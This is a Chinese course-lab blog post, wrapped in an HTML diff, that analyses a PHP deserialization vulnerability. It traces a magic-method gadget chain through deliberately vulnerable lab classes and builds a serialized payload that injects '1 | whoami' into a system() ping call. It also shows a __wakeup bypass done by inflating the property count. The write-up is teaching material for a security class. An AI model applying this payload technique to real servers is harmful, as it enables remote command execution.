@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
+  
+
+
+  <meta name="generator" content="Hexo 6.3.0">
+
+  
+
+  
+
+  
+    <meta name="author" content="Pechola Lee">
+  
+
+  
+
+  
+
+  <title>反序列化漏洞 | Pechola L</title>
+
+  
+
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.3/index.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlightjs@9.16.2/styles/monokai.css">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body>
+  <div class="root-container">
+    
+<!-- header container -->
+<header class="header-container post">
+  
+    <div class="post-image" style="background-image: url(/images/unserialize/WOD.jpg)"></div>
+  
+
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/">
+        
+          Pechola L
+        
+      </a>
+    </div>
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="navbar-list">
+        
+          <li class="navbar-list-item"><a href="/">首頁</a></li>
+        
+          <li class="navbar-list-item"><a href="/about">關於</a></li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    <div class="header-content">
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap">反序列化漏洞</h1>
+          <h2 class="title-sub-wrap">
+            <strong>Pechola doing Homework</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2023-04-19T03:30:00.000Z" itemprop="datePublished">2023-04-19</time>
+          </h2>
+          
+          
+          <ul class="wrap-list dark">
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+</ul>
+        </div>
+      </div>
+    </div>
+  
+
+  
+  
+  
+</header>
+
+    <!-- 文章 -->
+
+<!-- 文章内容 -->
+<div class="body-container">
+  <article class="content-container layout-block post-container">
+    <div class="article-info">
+      
+      
+      
+      
+      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
+        <p>这学期有门信息安全实践，让我和网络安全叙了叙旧。<br>想起车大的小学期，烈日下的南京，在空调开得很低的教二，摆弄SeedUbuntu… pwd&#x3D;&#x3D;dees</p>
+<p>这门课的实验还有点意思，反序列化漏洞对我的惊艳程度丝毫不亚于初识SQL注入，类和类环环相扣、魔术方法的冷箭；<br>记录一下这个很秀漏洞<br>虽然还不清楚这个接近白盒的漏洞在实际中是否真的好利用。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/PecholaL/backup/blob/main/CyberSecurity/unserialize.php">文件</a></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><strong>最终目标是执行命令whoami</strong>，从php文件中找到这最后一环。<br><code>GetFlag</code>中的<code>ping_exec()</code>，使用了<code>system()</code>函数，那么设置<code>$name</code>为<code>&quot;1|whoami&quot;</code>；注意这里有个<code>__wakeup()</code>，会给<code>$name</code>赋预设的值，所以需要 <strong>绕过</strong> 它（最后将提到），绕过方法为将序列化字符串中的属性个数设置为大于实际值的量；</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ping_exec</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ping -n 1 &quot;</span> . <span class="variable">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>下面就看从哪执行这个<code>ping_exec()</code>，找到类<code>string1</code>，不过是在一个魔法方法<code>__toString()</code>中调用的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;str1-&gt;<span class="title function_ invoke__">ping_exec</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当某处想把<code>string1</code>对象当做字符串处理时，就会用到其<code>__toString()</code>，继续找把它当字符串的类：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod2 = <span class="string">&quot;字符串拼接&quot;</span>.<span class="variable language_">$this</span>-&gt;mod1;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>很好，如果<code>func</code>的<code>$mod1</code>是<code>stirng1</code>的话就能达到调用<code>string1.__toString()</code>的目的；<br>而要想让<code>func</code>做工，应该有个外界力量激活它的<code>__invoke()</code>，也就是某处能做出<code>func()</code>这样的语句；<br>找到<code>funct</code>，把它的<code>$mod1</code>赋值为一个<code>func</code>，就能在<code>__call()</code>中make出想要的<code>func()</code>语句。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>,<span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="variable language_">$this</span>-&gt;mod1;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此时需要一个外界力量激活它的<code>__call()</code>，找了半天，这个比较隐晦，先看了看<code>__call()</code>的用法。<br>可以理解为：调用一个该类不存在的方法时，就会将方法名和参数传给<code>__call()</code>，这下就可以找到这个类了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;mod1 = <span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod1-&gt;<span class="title function_ invoke__">test1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果把它的<code>$mod1</code>赋值为一个<code>funct</code>，则析构的时候就会调用一个<code>funct</code>中没有的方法<code>test()</code>，由此激活<code>funct</code>的<code>__call()</code>；<br>另外析构方法<code>__destruct()</code>的调用很轻松，创建（反序列化）一个<code>start_gg</code>对象放在那等程序执行完就行了。</p>
+<h2 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h2><p>可以先不考虑正序反序怎么套，直接简单粗暴把上面提到的这些类各new一个：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$test1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">start_gg</span>();</span><br><span class="line"><span class="variable">$test2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">funct</span>();</span><br><span class="line"><span class="variable">$test3</span> = <span class="keyword">new</span> <span class="title function_ invoke__">func</span>();</span><br><span class="line"><span class="variable">$test4</span> = <span class="keyword">new</span> <span class="title function_ invoke__">string1</span>();</span><br><span class="line"><span class="variable">$test5</span> = <span class="keyword">new</span> <span class="title class_">GetFlag</span>();</span><br></pre></td></tr></table></figure>
+<p>再一步步把需要的对象成员赋值：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$test5</span> -&gt; name = <span class="string">&#x27;1 | whoami&#x27;</span>; </span><br><span class="line"><span class="variable">$test4</span> -&gt; str1 = <span class="variable">$test5</span>;</span><br><span class="line"><span class="variable">$test3</span> -&gt; mod1 = <span class="variable">$test4</span>;</span><br><span class="line"><span class="variable">$test2</span> -&gt; mod1 = <span class="variable">$test3</span>;</span><br><span class="line"><span class="variable">$test1</span> -&gt; mod1 = <span class="variable">$test2</span>;</span><br></pre></td></tr></table></figure>
+<p>序列化输出：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br></pre></td></tr></table></figure>
+<p>得到一个很长的可以作为payload的序列：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;start_gg&quot;:2:&#123;s:4:&quot;mod1&quot;;O:5:&quot;funct&quot;:2:&#123;s:4:&quot;mod1&quot;;O:4:&quot;func&quot;:2:&#123;s:4:&quot;mod1&quot;;O:7:&quot;string1&quot;:2:&#123;s:4:&quot;str1&quot;;O:7:&quot;GetFlag&quot;:2:&#123;s:4:&quot;name&quot;;s:10:&quot;1 | whoami&quot;;s:4:&quot;user&quot;;N;&#125;s:4:&quot;str2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
+<p>反序列化时记得要绕过<code>GetFlag</code>的<code>__wakeup()</code>方法——将序列化字符串中”GetFlag”后的属性个数由2改为3即可绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;start_gg&quot;:2:&#123;s:4:&quot;mod1&quot;;O:5:&quot;funct&quot;:2:&#123;s:4:&quot;mod1&quot;;O:4:&quot;func&quot;:2:&#123;s:4:&quot;mod1&quot;;O:7:&quot;string1&quot;:2:&#123;s:4:&quot;str1&quot;;O:7:&quot;GetFlag&quot;:3:&#123;s:4:&quot;name&quot;;s:10:&quot;1 | whoami&quot;;s:4:&quot;user&quot;;N;&#125;s:4:&quot;str2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>将payload写入一个文本文件，然后从php文件中读取并反序列化：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$s = file_get_contents(&#x27;s.txt&#x27;);</span><br><span class="line">unserialize($s)</span><br></pre></td></tr></table></figure>
+<p>可以找到<code>whoami</code>的执行结果，目的达成。<br>当然实际攻击是将这个payload放在Cookie或者URI中传给Server并由Server中的反序列化函数进行反序列化。</p>
+
+      </section>
+
+      
+      
+        <nav class="article-nav">
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+      <div class="card-cover" background-image-lazy data-img="/images/sleepy/sleepy0.jpg"></div>
+    
+    <div class="card-text">
+      
+        <a href="/2023/04/14/sleepy/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">25度，打个豁嗨</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
+
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
+    </div>
+    <div class="widget-info">
+      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-body">
+    
+      <img src="/images/avatar.png" class="soft-size--round soft-style--box" alt="Pechola">
+    
+    
+      <h2>Pechola</h2>
+    
+    
+      <p>不來也不去.</p>
+    
+  </div>
+</section>
+
+      
+
+    </div>
+  </article>
+</div>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    
+    <div class="social-icons">
+      
+        
+          <a href="https://github.com/PecholaL/" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
+</svg>
+          </a>
+        
+      
+    </div>
+     
+    <p>&copy; 2023 <a href="/" target="_blank">Pechola Lee</a></p>
+
+    
+
+
+    <p>
+      <a href="javascript:;" id="theme-light">陽</a>
+      <a href="javascript:;" id="theme-auto">☯️</a>
+      <a href="javascript:;" id="theme-dark">陰</a>
+    </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  <!-- aplayer -->
+
+
+<!-- dplayer -->
+
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+  <!-- 尾部用户自定义相关内容 -->
+</body>
+</html>
